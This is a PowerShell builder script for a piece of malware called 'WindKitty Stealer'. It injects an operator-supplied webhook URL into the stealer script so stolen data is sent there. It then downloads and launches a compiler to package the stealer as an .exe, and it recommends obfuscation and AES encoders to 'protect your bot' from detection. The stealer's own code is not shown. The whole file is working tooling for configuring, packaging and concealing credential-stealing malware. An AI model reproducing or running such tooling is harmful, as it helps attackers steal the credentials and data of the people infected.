$foldkittystealname = "stealer"
$kittyfilename = "WindKittyStealer.ps1"

$raw = Join-Path (Join-Path $PSScriptRoot $foldkittystealname) $kittyfilename

$rawstealer = Get-Content -Path $raw -Raw

$hook = '%webhook%'

if ($rawstealer -match $hook) {
    $UW = Read-Host "[+] Enter your webhook URL"

    $rawstealer = $rawstealer -replace $hook, $UW

    $rawstealer | Set-Content -Path $raw

    $compile = Read-Host "[+] Do you want to compile the script from PowerShell to .exe? (y/n)"
    
    if ($compile -eq 'y' -or $compile -eq 'Y') {
        Write-Host "[+] Downloading Compiler.. You need to compile it yourself." -ForegroundColor Magenta
        $url = "https://github.com/WindKitty/WindKitty-Stealer/releases/download/windkittycompiler/Compiler.zip"
        $dest = "$env:USERPROFILE\Downloads"

        Invoke-WebRequest -Uri $url -OutFile (Join-Path $dest "Compiler.zip")
        Expand-Archive -Path (Join-Path $dest "Compiler.zip") -DestinationPath $dest -Force
        Start-Process -Wait (Get-ChildItem -Path (Join-Path $dest "Compiler") -Filter "*.exe").FullName
    }
    else {
        $enc = Read-Host "[+] Do you want to encode the script file? (y/n)"
        
        if ($enc -eq 'y' -or $enc -eq 'Y') {
            Write-Host "[+] Use one of these Encoders to protect your bot." -ForegroundColor Yellow
            Write-Host "https://github.com/AdminTest0/Invoke-Obfuscation-Bypass" -ForegroundColor Yellow
            Write-Host "https://github.com/Chainski/AES-Encoder" -ForegroundColor Yellow
        }
    }
}
else {
    Write-Host "[-] No placeholders found in the script, manually customize the values, thanks <3." -ForegroundColor Red
}
Start-Sleep 20 # added so user can read something and it doesnt close.. like in python time module closes after specified second clock
